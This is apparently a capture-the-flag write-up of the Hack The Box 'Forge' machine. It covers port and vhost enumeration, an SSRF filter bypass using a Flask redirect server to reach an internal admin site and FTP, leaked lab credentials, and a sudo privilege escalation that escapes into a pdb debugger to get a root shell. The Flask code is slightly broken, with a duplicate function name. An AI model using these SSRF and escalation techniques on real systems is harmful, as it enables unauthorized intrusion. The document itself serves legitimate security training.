### Enum
```bash
# Nmap 7.94 scan initiated Thu Oct 19 11:28:02 2023 as: 
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/alvin/Documents/OSEP/HTB/Linux/Forge/results/forge.htb/scans/_quick_tcp_nmap.txt -oX /home/alvin/Documents/OSEP/HTB/Linux/Forge/results/forge.htb/scans/xml/_quick_tcp_nmap.xml forge.htb
Nmap scan report for forge.htb (10.129.51.175)
Host is up, received user-set (0.30s latency).
Scanned at 2023-10-19 11:28:02 NZDT for 53s
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE REASON         VERSION
21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```
##### Upload through url
It is python
```bash
nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.51.175] 44422
GET / HTTP/1.1
Host: 10.10.16.4
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

##### Let's fuzz via burp
```bash
POST /upload HTTP/1.1
Host: forge.htb
Origin: http://forge.htb
Content-Type: application/x-www-form-urlencoded

url=http://localhost&remote=1

URL contains a blacklisted address!
```

Bypassing technic is fuzzy, that you have to do weird casing.

```bash
url=http://forGe.htb&remote=1

curl http://forge.htb/uploads/wxgccpxplCvvijLCXEkz
```

I checked all other writeups. It seems like at this stage, we need to do a vHosting scan in order to leverage that file reading above.

##### ffuf for vhost
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://$IP -H 'Host: FUZZ.forge.htb' -fw 18

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.51.175
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2, Duration: 649ms]
:: Progress: [19966/19966] :: Job [1/1] :: 282 req/sec :: Duration: [0:01:16] :: Errors: 0 ::
```

`curl http://forge.htb/uploads/ZhqELO9gH7zjS7KKoAkP`

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

* http://admin.forge.htb/announcements
* http://admin.forge.htb/upload
* http://admin.forge.htb/static/css/main.css

`curl http://forge.htb/uploads/fM3mhGBQkjvPHb25e08M`
```html
<!DOCTYPE html>
<html>
<head>
    <title>Upload an image</title>
</head>
<body onload="show_upload_local_file()">
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">
    <script type="text/javascript" src="/static/js/main.js"></script>
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <center>
        <br><br>
        <div id="content">
            <h2 onclick="show_upload_local_file()">
                Upload local file
            </h2>
            <h2 onclick="show_upload_remote_file()">
                Upload from url
            </h2>
            <div id="form-div">
                
            </div>
        </div>
    </center>
    <br>
    <br>
</body>
</html>
```

`curl http://forge.htb/uploads/5W9DgZmacDO2ircP9Ait`

```html
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```
##### SSRF Fails

```bash
curl http://admin.forge.htb
Only localhost is allowed!
```
Based on that enumeration, there are two interesting targets:

    The admin site which can only be accessed from localhost;
    The FTP server which is behind the firewall. (21/tcp filtered ftp     no-response)
    user:heightofsecurity123! supports ftp, ftps, http and https protocols for uploading from url?u=<url>

##### Redirection to Admin
* https://0xdf.gitlab.io/2022/01/22/htb-forge.html#redirection-to-admin

Instead of bypassing the filter directly, I’ll show a redirect bypass.

I know that it’s a Python script that is handling my input, making filtering decisions, and then using the `requests` module to make the HTTP request. The requests module by default will follow HTTP redirects unless the function is called with `allow_redirects=False`.

My strategy is to have the site request a url on my host. That will pass any filtering without issue. The webserver will return an HTTP redirect back to `http://admin.forge.htb`, which requests will follow, and the resulting text will be made available to me via the link.

I’ll write a simple Flask server to do this with ChatGPT

```python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/')
def redirect_to_admin():
    return redirect("http://admin.forge.htb", code=302)

@app.route("/a")
def annoucements():
    return redirect('http://admin.forge.htb/announcements')

@app.route("/u")
def annoucements():
    return redirect('http://admin.forge.htb/upload')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
    ```

```bash
python flask_server.py
 * Serving Flask app 'flask_server'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://172.16.153.128:80
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 495-965-724
10.129.51.175 - - [19/Oct/2023 17:23:46] "GET / HTTP/1.1" 302 -
10.129.51.175 - - [19/Oct/2023 17:24:24] "GET /a HTTP/1.1" 302 -
10.129.51.175 - - [19/Oct/2023 17:25:22] "GET /u HTTP/1.1" 302 -
10.129.51.175 - - [19/Oct/2023 17:31:24] "GET /ftp HTTP/1.1" 302 -
 * Detected change in '/home/alvin/Documents/OSEP/HTB/Linux/Forge/flask_server.py', reloading
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 495-965-724
10.129.51.175 - - [19/Oct/2023 17:33:08] "GET /ftp HTTP/1.1" 302 -

curl http://forge.htb/uploads/ippl8vjlOADWTOMAVoZo
drwxr-xr-x    3 1000     1000         4096 Aug 04  2021 snap
-rw-r-----    1 0        1000           33 Oct 18 22:05 user.txt
```

##### Foothold as user
One thing that keep remembering that is id_rsa need an empty line at the bottom.

### Root
* https://0xdf.gitlab.io/2022/01/22/htb-forge.html#shell-as-root

##### Enum
```bash
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
    ```

It picks a random port over 1024 and listens on it. When someone connects, they are prompted for the password, “secretadminpassword”. If they give it, they get a menu of four options. Three use `subprocess` to run a command and return the output, and the last option exits.

I can run this and it prints that it’s listening. Then I’ll SSH in to get another listener, and connect to that port.

##### Exploit

`pdb` is great, but it will allow the user interacting with it to run arbitrary Python commands. So if I can make the script throw an exception, I can run commands as root.

The obvious place to generate an exception is here: `option = int(clientsock.recv(1024).strip())`

```bash
sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:11563
invalid literal for int() with base 10: b'0xdf'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)

(Pdb) import os
(Pdb) os.system('bash')
root@forge:/home/user#
```